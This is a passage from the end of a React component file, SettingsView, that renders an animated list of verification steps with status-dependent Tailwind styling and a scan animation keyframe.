                    </div>
                 </div>

                 <div className="space-y-3.5 w-full text-left" dir="ltr">
                    {verificationSteps.map((step, idx) => (
                        <div 
                          key={idx} 
                          className={`flex items-center gap-3.5 transition-all duration-500 ${step.status === 'active' ? 'opacity-100 scale-100' : step.status === 'completed' ? 'opacity-35' : 'opacity-10'}`}
                        >
                            <div className={`w-8 h-8 rounded-lg flex items-center justify-center border transition-all duration-500 ${
                              step.status === 'pending' ? 'bg-[#060609] border-zinc-900 text-zinc-800' : 
                              step.status === 'active' ? 'bg-red-500 border-red-550 text-black shadow-[0_0_15px_rgba(239,68,68,0.2)]' : 
                              'bg-red-500/10 border-red-500/20 text-red-500'
                            }`}>
                                {step.status === 'active' ? <Unlock className="w-4 h-4" /> : <step.icon className="w-4 h-4" />}
                            </div>
                            <span className={`text-[10px] font-black uppercase tracking-widest font-mono ${step.status === 'active' ? 'text-white' : 'text-zinc-500'}`}>
                               {step.label}
                            </span>
                        </div>
                    ))}
                 </div>
              </div>
           </div>
        </div>
      )}

      <style>{`
        @keyframes scan {
          0% { top: 0%; }
          100% { top: 100%; }
        }
      `}</style>
    </div>
  );
};

export default SettingsView;
